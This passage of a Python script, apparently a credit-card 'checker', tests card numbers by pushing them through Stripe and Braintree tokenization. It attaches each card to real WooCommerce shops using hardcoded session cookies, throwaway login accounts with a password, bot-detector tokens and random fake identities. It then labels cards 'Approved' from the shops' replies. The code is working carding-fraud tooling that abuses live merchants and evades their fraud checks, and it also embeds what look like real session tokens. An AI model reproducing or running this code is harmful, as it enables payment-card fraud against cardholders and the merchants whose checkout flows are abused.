2WEI5OUtlaUNkUk4veDJOSE1lejNDMElzbjV6MWIyVllYWDNSV09LV1B2b3ZMd1NYM2VJR0RCTlB2T3VhUnRsb01odDJYN1YwK2oyb1lMR2t4MkhtYUZBdm5PREQ4ZmRyczJ3QzN4UlZrNDMzbFFZVnE3SkxFaFpPdlFod1RWWjNCbGhiUDhuL2Q3V240SytackNyMU40Ynkra2FGTmZST3lwMGdoODZLQjRubC9KcERWU2dtcmhiS09YVStDeUVZL0xFNXBJVHUzVSsyR25RSCs2Ny9MOUcySjZESU95RWFsSHlvWUtkVjZzcWxaYnBLWVc5aDdrYXpJcDduUmZkQ2xvb3BTRU1aZzZpcTBGMUw3VXdqVDBLQ21nU1RzSWFBd21aVUxLTVhTWjZQSEVtUnlJM1lUUjJZWFVjMDBtSytBeGcydlRSRjFNSTErMldETy80YWdSc2xIVkdhOTM3NDFVUFYwMkZPcVhQK252SElHM3ZnM2c3a1dwbHJ0cktoODc2TUFZaVY2akowNVoxOEJsb2w5RUIxdXR2K0dWUnB1QVpMeVZHN0pNaVZISFZwQkxxbW5QTVZnbkgxS2JVeVd5SzVad09FNXJ6R1R6Q2ZZOU96bjYyQkpKUzJsMVhLdUliWExQeFo5Z1pKdGFKbGdzMHh5V3VYL3dMNkdBT1h4V3BTWE9JQXVZOG45Um1FRUhjWm5Pc1R1LzVCY3BERFIwdDZBN0hpTW5xTnpuSGkrOHhLQ1Rxc3lCdVZuVUcybTJFeW1PRXJxK3JVN3Z0MEZqeklvalRwQ1dUNHo3aEZ2dW1VR3dEVGVKazdYR2JScDQ0UEZHSUdQS3d6cVVqbEZoZlp6MWhGQW50YUdOb29OYVFPZnpDcjVSc291WTRkcG1obEp0MDlrTHhHMjlzVDk5VHdkazY1Q1BENWIzQUYvK3g4VG9SdVY1OHVoTzVSTDdKWkE5OFFuZHBxcTZjVUhpblFSZ0JaZy9NZDR5S2l4TWVpN2lJK0txOHNScXVQdDczTi90YmMxN1A1NitnRXpidkRSVzloOFNKa0FzbjliV2tSQjk2bGowN3Y4Z1haaEh6dDIzVk5OSnVHTlJtcTRjcmhva1J6ZnhGQndNZTk1ZEpJN2JISFRhbzFVMmd0Vy9jQ215Ym5CSnNvT1JkSXYraEtKOTI5bGU3bTRMMURnV3lCTFZyaE9zYTAzY1UzMjFRTUcxU08yd3VEWmRDbm9vZ1JUSGp1NTRHZkJZMktaNm9wVFdKS2pXRGd4Nm54QnEwaEJZcFdwd3dleXh2Zm1VNFYyVHc5by9nK2t3UVNMNGdlY0E4c1o1ejNkdC9HbllxVHJ3ZVhRcHlLMDQwbTViMVI5Z0xMeFBrNzQ0NjJXWVIveEY1TDFUcUlSRHFhNXFVRTJmWGVpSnZ2SUNocVZCWk40UGJZVURKRE1LK1F6SWw2djd6eVF0cVNlMkF1TVJwa0M3UzJEUzVmVmdUeVJhdzRuNGhCTjdoOFBudlFIelhDc0V2Zk1KNmpZdGhHMXN3VGxhdGw3bjJ0L1hITWwxUm81MjFRZTloSVFVblBBNVNOVmRQRFkzdjVDSEEzeVhBak83Q1BXekhTVWE4ZERocmc5MTJhNkswb01RQnFrcHV6dllJWTBTYWFtR21BMi8rWktXMGQzZlAwNzhRK3Q4VkVobjIrUGVrNmdMZldoaTNTa3dMM3RpWWFaNXRsanFoM0xReWJpdWdKZTNId0svdjlROWIvdGZzTm5LNk1wMW80ZUwreWsxZG5mS0sxOVFuL0pkN2lrTHMzWWx5OU9aK28xaE5IUGszSFg0QWJOQWNFcUtwbkxPUWJjaUc0RkJxclY4aVJ5aDlmVktZS0NTMjJNMmQzcmFEbHZiajRQbWNzWG9HcndLN2pvRVVhR1hPMUNZV0xaUS9XRkdJZE4zZmVIbklSQ3p2SFd1ZFdEYmt6ZmZiNVJQVUc1SW5ITnpCRFc5ZUVsb0wxQUxQaXN6MXdzdjBNWGxiQlVhT1VGdzNteFRsQ0U2bnV6R0xucmlCRUM2RHFGUXNralZZc3cvcmE2S0hRVnhuTEc1clRFdmN4TEp3cmp4VXJaK0FxY0VBVWx0cUF5aWZEd3V3RlBvL2czMWs0NlVmbngwc1R2Y2FiU1FUVWZlQnR0NVJYcGlZVXA1VU9SV2FOQ1dWRURVdjNqOWlUeWQ4SDdXd1BEL1JjdmovUUVGQ29GYWdkK0ExYW5OMFdabEwrbWFFTkswQ2E4MC9wZDZmZlVkckxhSUp0aEw5SVdEMUw2V0EzUkhMTEZ3QVM0TVV2NmZrS29WOEg1L2ZVaU51WGtBYnd0Y0hOIiwiZXhwIjoxNzI0MTc1MjgwLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiNmQ4ZDQ3NSIsInBkIjowLCJjZGF0YSI6IjdHOHBtbXo0TFYzWFR3V3h2OGxwdjJ2TE5FMStxWHRDY1RuVWdwOStTdTBuSjd0Y0N2MTVzelYxWnZzQ1JCeUxVZ3ZaUGpVT3FhMHJKYnhUMDNoZktENEpGVlg1U3dqK2s0L1BSVEVBWmsvTk1YbkRwM3RSRFVBaDJPVGVyTmR4eHBDb0hBOHpGYldTcTdycENHNEZNQWdoVEV4d1pncjBvTGFpQisvTlBzaVY3QU0rK0tkVHhFQmMyRXFpQk5mY2hNV3E4ejZ3Z0h4OHJsNHUifQ.1G7nUqVyGrZVOfG4119beLqkD4rN5V1JpxrrmMGstds'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])

	cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-08-20%2017%3A22%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-08-20%2017%3A22%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36',
        'wordpress_logged_in_91a18015bc49184c8421dc9760de082a': 'adfeaqfa%7C1725384181%7CAsiqfRrIIP8UB1zUAkx45K5CGSMxOMv2sljDkS5O1Jz%7Ca4fc8b29ceaf8c031245376d93a1b0046e6ae88ac42e7c9125d8ee85ec271592',
        'wfwaf-authcookie-9c4837e9d6601129e38c747df8161394': '86477%7Cother%7Cread%7C09f20f40c7c867e951542b538775866beb403f459de6822316ef324c0276809e',
        'receiptful-session': '739f1e9a-c133-4542-aa9e-bab55ac445cb',
        'receiptful-token': '4c415f34-1388-40ff-b56b-3598af441b32',
        '_gcl_au': '1.1.196944627.1724174597',
        '_gid': 'GA1.2.448336359.1724174606',
        '_fbp': 'fb.1.1724174609572.34442849308426914',
        '_pin_unauth': 'dWlkPU1EVTFObVJpT0RJdE5qRmhaaTAwWTJObUxXSXpZVGd0TkdNeFpqWmtaRFpsWkRZMQ',
        '__stripe_mid': '59216b65-f71c-4b7b-8ad7-285889bdd449240699',
        '__stripe_sid': '450c5cfd-885e-4a38-be95-4cbcd6f0982b778132',
        'receiptful-popup-token': '148ce52c-2b51-4f2d-9fb3-9faed131c120',
        '_ga_ZX0M5YM2NF': 'GS1.1.1724174605.1.1.1724174843.0.0.0',
        '_ga': 'GA1.2.10404801.1724174605',
        'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F',
    }

	headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2017%3A22%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2017%3A22%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; wordpress_logged_in_91a18015bc49184c8421dc9760de082a=adfeaqfa%7C1725384181%7CAsiqfRrIIP8UB1zUAkx45K5CGSMxOMv2sljDkS5O1Jz%7Ca4fc8b29ceaf8c031245376d93a1b0046e6ae88ac42e7c9125d8ee85ec271592; wfwaf-authcookie-9c4837e9d6601129e38c747df8161394=86477%7Cother%7Cread%7C09f20f40c7c867e951542b538775866beb403f459de6822316ef324c0276809e; receiptful-session=739f1e9a-c133-4542-aa9e-bab55ac445cb; receiptful-token=4c415f34-1388-40ff-b56b-3598af441b32; _gcl_au=1.1.196944627.1724174597; _gid=GA1.2.448336359.1724174606; _fbp=fb.1.1724174609572.34442849308426914; _pin_unauth=dWlkPU1EVTFObVJpT0RJdE5qRmhaaTAwWTJObUxXSXpZVGd0TkdNeFpqWmtaRFpsWkRZMQ; __stripe_mid=59216b65-f71c-4b7b-8ad7-285889bdd449240699; __stripe_sid=450c5cfd-885e-4a38-be95-4cbcd6f0982b778132; receiptful-popup-token=148ce52c-2b51-4f2d-9fb3-9faed131c120; _ga_ZX0M5YM2NF=GS1.1.1724174605.1.1.1724174843.0.0.0; _ga=GA1.2.10404801.1724174605; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F',
        'origin': 'https://www.fashionchingu.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fashionchingu.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

	params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }

	data = {
        'stripe_source_id': id,
        'nonce': '4a221c2a4c',
    }

	response = requests.post('https://www.fashionchingu.com/', params=params, cookies=cookies, headers=headers, data=data)
	try:
		return(response.json()['data']['status'])
	except:
		return(response.json()['data']['error']['message'])
def b3(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests
	acc = ['jabapaj169@givehit.com', 'sehawo9267@polatrix.com','paxibo6273@iteradev.com','vecero7501@segichen.com']
	email = random.choice(acc)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	data = {
    'username': email,
    'password': 'A@Amir5520055',
    'wpa_initiator': '',
    'alt_s': '',
    'udwsno9687': '828176',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
}
	
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'd251affb-6b72-4cfd-b93e-db6cb20bcd10',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '323 E Pine St',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {'user-agent': user}
	
	data = {
	    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"4a22481c8661fe4dad5bbd95a7081548","fraud_merchant_id":null,"correlation_id":"c65afe459618e3fa0114dabd2c40d90a"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/h6nck7m2yyh6mqk4/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/h6nck7m2yyh6mqk4"},"merchantId":"h6nck7m2yyh6mqk4","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"h6nck7m2yyh6mqk4","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333843690920608617","accessToken":"access_token$production$h6nck7m2yyh6mqk4$c17263feed9f66d5cc7e08f975927dd8","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"KBS Research","clientId":"AZ2WICgQ3fCYcNKRNgw9m3wd5_brlV542A4KeOL3mkkw11N4itXNyWxL_R7KGD0tX8Ssa3bEiyGG10gc","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"kbsresearch_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjh9fQ==',
}
	
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def generate_fake_address():
    user = user_agent.generate_user_agent()
    headers = {'user-agent': user}
    r = requests.session()
    response = r.get('https://www.prepostseo.com/tool/fake-address-generator', headers=headers)
    response = r.get('https://www.prepostseo.com/tool/fake-address-generator', headers=headers, cookies=r.cookies)
    tok = response.text.split('name="_token" content="')[1].split('" />')[0]

    # تحديث الهيدرز مع التوكن
    headers.update({
        'x-csrf-token': tok,
        'x-requested-with': 'XMLHttpRequest',
    })

    # البيانات لإرسال الطلب
    data = {'lang': 'en_US'}

    # إرسال الطلب للحصول على البيانات المزيفة
    response = r.post('https://www.prepostseo.com/ajax/fake-address-generator', cookies=r.cookies, data=data, headers=headers).json()
    extracted_data = response[0]
    return {
        'name': extracted_data['name'],
        'email': extracted_data['email'],
        'phone': extracted_data['phone'],
        'postcode': extracted_data['postcode'],
        'street_address': extracted_data['streetAddress'],
        'city': extracted_data['city'],
        'country': extracted_data['country'],
        'state': extracted_data['state'],
        'company': extracted_data['company'],
        'gender': extracted_data['gender'],
        'credit_name': extracted_data['credit']['name'],
        'first_name': extracted_data['credit']['name'].split(' ')[0],
        'last_name': extracted_data['credit']['name'].split(' ')[1],
        'credit_expiration_date': extracted_data['credit']['expirationDate'],
        'account_no': extracted_data['accountNo'],
        'username': extracted_data['username'],
        'password': extracted_data['passw'],
        'ipv4': extracted_data['ipv4'],
        'ipv6': extracted_data['ipv6'],
        'mac_address': extracted_data['macad'],
        'semail': extracted_data['semail'],
        'user_agent': extracted_data['uagent'],
        'job_title': extracted_data['jobtitle'],
        'com_email': extracted_data['comemail'],
        'salary': extracted_data['salary'],
        'iban': extracted_data['iban'],
        'dob': extracted_data['dob'],
        'age': extracted_data['age'],
        'height': extracted_data['height'],
        'weight': extracted_data['weight'],
        'hair': extracted_data['hair'],
        'eye': extracted_data['eye'],
        'bank': extracted_data['bank'],
        'bcode': extracted_data['bcode']
    }
data = generate_fake_address()
name = data['name']
email = data['email']
phone = data['phone']
postcode = data['postcode']
street_address = data['street_address']
city = data['city']
country = data['country']
state = data['state']
company = data['company']
gender = data['gender']
credit_name = data['credit_name']
first_name = data['first_name']
last_name = data['last_name']
credit_expiration_date = data['credit_expiration_date']
account_no = data['account_no']
username = data['username']
password = data['password']
ipv4 = data['ipv4']
ipv6 = data['ipv6']
mac_address = data['mac_address']
semail = data['semail']
user_agent_str = data['user_agent']
job_title = data['job_title']
com_email = data['com_email']
salary = data['salary']
iban = data['iban']
dob = data['dob']
age = data['age']
height = data['height']
weight = data['weight']
hair = data['hair']
eye = data['eye']
bank = data['bank']
bcode = data['bcode']
print(name)
print(email)
print(phone)
print(postcode)
print(street_address)
print(city)
print(country)
print(state)
print(company)
print(gender)
print(credit_name)
print(first_name)
print(last_name)
print(credit_expiration_date)
print(account_no)
print(username)
print(password)
print(ipv4)
print(ipv6)
print(mac_address)
print(semail)
print(user_agent_str)
print(job_title)
print(com_email)
print(salary)
print(iban)
print(dob)
print(age)
print(height)
print(weight)
print(hair)
print(eye)
print(bank)
print(bcode)

def cvv(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	    'authority': 'thelittlekeepsakecompany.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://thelittlekeepsakecompany.com/my-account/', headers=headers)
	
	
	
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	
	headers = {
	    'authority': 'thelittlekeepsakecompany.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://thelittlekeepsakecompany.com',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'email': acc,
    'woocommerce-register-nonce': register,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}
	
	response = r.post('https://thelittlekeepsakecompany.com/my-account/', headers=headers, data=data)
	
	headers = {
	    'authority': 'thelittlekeepsakecompany.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/edit-address/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://thelittlekeepsakecompany.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'authority': 'thelittlekeepsakecompany.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://thelittlekeepsakecompany.com',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
